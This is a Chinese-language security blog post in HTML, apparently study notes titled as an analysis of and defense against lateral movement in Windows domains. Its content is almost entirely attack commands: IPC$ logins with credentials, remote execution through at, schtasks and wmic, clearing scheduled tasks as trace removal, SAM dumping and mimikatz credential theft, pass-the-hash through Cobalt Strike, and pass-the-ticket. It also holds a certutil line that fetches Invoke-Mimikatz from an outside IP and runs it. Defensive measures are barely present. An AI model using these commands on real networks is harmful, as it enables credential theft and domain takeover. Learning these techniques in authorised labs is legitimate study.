@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>第五章：域内横向移动分析及防御 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="IPC IPC的利用条件如下所示： 开启了139和445端口：IPC$需要139和445端口的支持。 管理员开启了默认共享：通过IPC$，可以实现对这" /><meta name="keywords" content="Security, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.96.0 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/security/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="第五章：域内横向移动分析及防御" />
+<meta property="og:description" content="IPC IPC的利用条件如下所示： 开启了139和445端口：IPC$需要139和445端口的支持。 管理员开启了默认共享：通过IPC$，可以实现对这" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/security/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-05-22T12:07:36+08:00" />
+<meta property="article:modified_time" content="2021-05-22T12:07:36+08:00" />
+
+<meta itemprop="name" content="第五章：域内横向移动分析及防御">
+<meta itemprop="description" content="IPC IPC的利用条件如下所示： 开启了139和445端口：IPC$需要139和445端口的支持。 管理员开启了默认共享：通过IPC$，可以实现对这"><meta itemprop="datePublished" content="2021-05-22T12:07:36+08:00" />
+<meta itemprop="dateModified" content="2021-05-22T12:07:36+08:00" />
+<meta itemprop="wordCount" content="2070">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="第五章：域内横向移动分析及防御"/>
+<meta name="twitter:description" content="IPC IPC的利用条件如下所示： 开启了139和445端口：IPC$需要139和445端口的支持。 管理员开启了默认共享：通过IPC$，可以实现对这"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">第五章：域内横向移动分析及防御</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-05-22 </span>
+        <div class="post-category">
+            <a href="/categories/security/"> security </a>
+            </div>
+          <span class="more-meta"> 约 2070 字 </span>
+          <span class="more-meta"> 预计阅读 5 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#ipc">IPC</a></li>
+        <li><a href="#单机密码抓取">单机密码抓取</a></li>
+        <li><a href="#pth哈希传递">PTH哈希传递</a></li>
+        <li><a href="#ptt票据传递">PTT票据传递</a></li>
+        <li><a href="#使用wmi执行命令">使用WMI执行命令</a></li>
+        <li><a href="#其他">其他</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="ipc">IPC</h2>
+<p>IPC的利用条件如下所示：</p>
+<ul>
+<li>开启了139和445端口：IPC$需要139和445端口的支持。</li>
+<li>管理员开启了默认共享：通过IPC$，可以实现对这些默认共享目录的访问。</li>
+<li>知道目标的账号密码。</li>
+</ul>
+<p>例如输入如下命令即可建立IPC连接：</p>
+<pre><code>net use \\192.168.52.138\ipc$ &quot;123456789_CG&quot; /user:pinger
+</code></pre>
+<p>输入如下命令查看当前的连接：</p>
+<pre><code>net use
+</code></pre>
+<p>建立连接后，可以通过使用如下命令先简单的获取目标的一些信息：</p>
+<pre><code># 获取目标C盘目录信息
+dir \\192.168.52.138\\c$
+# 获取目标运行的进程（查看是否有杀软等）
+tasklist /S 192.168.52.138 /U pinger /P 123456789_CG
+</code></pre>
+<p>最后，可以利用计划任务结合IPC进行命令执行，主要分为两种方式：at方式和schtasks方式，前者比较适用于windows server 2008之前的版本。</p>
+<p>（1）at方式：</p>
+<p>首先查看目标机器的当前时间：</p>
+<pre><code>net time \\192.168.50.138
+</code></pre>
+<p>然后将包含命令的文件上传到目标机器：</p>
+<pre><code>copy payload.bat \\192.168.52.138\C$
+</code></pre>
+<p>接着使用at创建计划任务执行payload.bat</p>
+<pre><code># 利用计划任务无回显执行命令
+at \\192.168.52.138 14:59PM C:\payload.bat
+# 利用计划任务带回显执行命令
+at \\192.168.52.138 14:59PM cmd.exe /c &quot;ipconfig &gt;C:/res.txt&quot;
+# 查看命令直接结果
+type \\192.168.52.138\C$:\\res.txt
+# 如果遇到了计划任务提示：无效句柄，则需要添加HOST
+echo 192.168.52.138 DcHost &gt;&gt;　C:\windows\system32\drivers\etc\hosts
+</code></pre>
+<p>最后就是清理痕迹，清除计划任务：</p>
+<pre><code>at \\192.168.52.138 7 /delete
+</code></pre>
+<p>（2）schtasks方式：</p>
+<p>使用schtasks方式创建计划任务执行payload.bat，计划开机时启动，入下所示：</p>
+<pre><code># 需要建立IPC的用户拥有权限
+schtasks /create /s 192.168.52.138 /tn test /sc onstart /tr c:\payload.bat /ru system /f
+</code></pre>
+<p>然后就是启动计划任务：</p>
+<pre><code>schtasks /run /s 192.168.52.138 /i /tn &quot;test&quot;
+</code></pre>
+<p>然后删除计划任务：</p>
+<pre><code>schtasks /delete /s 192.168.52.138 /tn &quot;test&quot; /f
+</code></pre>
+<p>最后删除IPC连接：</p>
+<pre><code>net use \\192.168.52.138\ipc$ /del /y
+</code></pre>
+<h2 id="单机密码抓取">单机密码抓取</h2>
+<ul>
+<li>必须是System权限；</li>
+<li>本地用户名、散列值和其他安全验证信息都保存在SAM文件中；</li>
+<li>SAM文件保存在 <code>C:\Windows\System32\config</code> 中；</li>
+<li>SAM文件是锁定的，不允许复制；</li>
+<li>可以使用VSS卷影拷贝的方式将SAM文件复制出来；</li>
+<li>可以使用工具将散列值和明文密码从内存中的lsass.exe进程或者SAM文件中导出；</li>
+</ul>
+<p>主要介绍几种好用的方式：</p>
+<p>（1）导出目标SAM和System，在本地获取NTLM Hash(防止mimikatz被杀)：</p>
+<p>首先需要导出目标的SAM文件，命令如下：</p>
+<pre><code>reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+</code></pre>
+<p>在本地使用mimikatz读取SAM和System文件获取Hash，将前面在目标机器生成的sam.hive和system.hive导出到本地，在本地的mimikatz输入如下命令进行解析：</p>
+<pre><code>lsadump::sam /sam:C:/Users/18148/Desktop/sam.hive /system:C:/Users/18148/Desktop/system.hive
+</code></pre>
+<p>（2）使用mimikatz在目标机直接读取SAM，导出Hash（不免杀）：</p>
+<p>在目标机器上执行mimikatz，输入如下命令：</p>
+<pre><code># 提升权限
+privilege::debug
+# 将权限提升到System
+token::elevate
+# 读取本地SAM文件，导出NTLM Hash
+lsadump::sam
+</code></pre>
+<p>（3）使用mimikatz在目标机直接读取SAM，导出Hash和 <strong>明文密码</strong> （不免杀）：</p>
+<p>在目标机器上执行mimikatz，输入如下命令：</p>
+<pre><code>mimikatz &quot;sekurlsa::logonpasswords&quot;
+</code></pre>
+<p>（4）使用powershell远程加载mimikatz抓取Hash和 <strong>明文密码</strong> ：</p>
+<p>在目标机器上输入如下命令：</p>
+<pre><code># 先下载mimikatz脚本
+certutil.exe -urlcache -split -f http://49.234.105.98:8080/Invoke-Mimikatz.ps1
+# 设置powershell的执行策略为开放
+Set-ExecutionPolicy Unrestricted
+# 导入并执行mimikatz
+powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command '&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;'
+</code></pre>
+<h2 id="pth哈希传递">PTH哈希传递</h2>
+<ul>
+<li>windows server 2012 R2及之后的版本中，默认在内存中不会记录明文密码；</li>
+<li>可以使用PTH进行权限验证，控制远程主机；</li>
+<li>使用PTH无需破解散列值，可以直接控制远程主机；</li>
+<li>如果安装了KB2871997补丁，则无法与远程计算机进行连接，无法对远程计算机使用psexec、wmi、smbexec、schtaskts、at等，也无法访问远程主机的文件共享；</li>
+<li>安装了KB2871997可以使用SID为500的Administrator账号进行PTH；</li>
+</ul>
+<p>这里演示使用CS内置的mimikatz进行PTH控制主机。首先使用CS的mimikatz导出Hash，如下所示（域管帐号）：</p>
+<p><img src="/media/2021-05-22-1.png" alt="mimikatz导出hash"></p>
+<p>然后在CS的targets处加上需要横向移动的目标机器：</p>
+<p><img src="/media/2021-05-22-2.png" alt="CS手动添加需要横向移动的target"></p>
+<p>选中添加的target主机，右键选择jump-&gt;psexec，填写如下设置：</p>
+<p><img src="/media/2021-05-22-3.png" alt="psexec"></p>
+<p>最终得到目标主机的beacon，如下所示(好像挺耗时的)：</p>
+<p><img src="/media/2021-05-22-4.png" alt="得到目标的beacon"></p>
+<p>Notice： <strong>如果获得了DC的shell，那么可以用CS的dcsync god.org获取域内所有Hash</strong></p>
+<h2 id="ptt票据传递">PTT票据传递</h2>
+<p>PTT不需要本地管理员权限即可进行。主要采用两种方式进行PTT。</p>
+<p>（1）使用mimikatz进行PTT（我实验失败了=-=）</p>
+<p>首先使用mimikatz导出内存中的已存在的票据，输入如下命令：</p>
+<pre><code>mimikatz sekurlsa::tickets /export
+</code></pre>
+<p>然后使用mimikatz进行PTT，输入如下命令：</p>
+<pre><code># 先清除当前内存中的票据
+mimikatz kerberos:purge
+# 然后注入高权限的票据
+mimikatz kerberos::ptt &quot;C:\ticket\[0;214ba17]-2-1-40e00000-Administrator@krbtgt-GOD.ORG.kirbi&quot;
+</code></pre>
+<p>（2）使用kekeo进行PTT（我实验失败了=-=）</p>
+<p>需要已知以下条件：</p>
+<ul>
+<li>目标域名；</li>
+<li>域用户名和NTLM Hash；</li>
+</ul>
+<p>首先清空缓存中的票据：</p>
+<pre><code>kekeo.exe &quot;kerberos::purge&quot; &quot;exit&quot;
+</code></pre>
+<p>然后利用kekeo和已知条件生成票据：</p>
+<pre><code>kekeo.exe &quot;tgt::ask /user:administrator /domain:god.org /ntlm:a45a7246dd74b64a67f22fd7020f1bd8&quot; &quot;exit&quot;
+</code></pre>
+<p>然后就是导入了：</p>
+<pre><code>kekeo.exe &quot;kerberos::ptt TGT_administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;
+</code></pre>
+<h2 id="使用wmi执行命令">使用WMI执行命令</h2>
+<p>psExec被杀的严重，可以考虑使用wmi进行远程控制。如下是不利用工具进行wmi命令执行的方法：</p>
+<p>首先建立ipc连接：</p>
+<pre><code>net use \\192.168.52.138\ipc$ &quot;123456789_CG&quot; /user:domain
+</code></pre>
+<p>然后利用wmi执行命令，并将结果输出到res.txt中：</p>
+<pre><code>wmic /node:192.168.52.138 process call create &quot;cmd.exe /c ipconfig &gt;C:\\res.txt&quot;
+</code></pre>
+<h2 id="其他">其他</h2>
+<ul>
+<li>ms17-010；</li>
+<li>psexec、wmi、smbexec；</li>
+<li>spn扫描：setspn -T god.org -F -Q <em>/</em></li>
+<li>keberoast离线爆破NTLM Hash；</li>
+<li>exchange常规信息收集；</li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">P1n93r</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-05-22
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/security/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">第六章：域控制器安全</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/code_audit/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
+            <span class="next-text nav-default">Shiro550反序列化分析</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'p1n93r';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:pin83r@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/p1n93r" class="iconfont icon-github" title="github"></a>
+  <a href="https://p1n93r.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>P1n93r</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
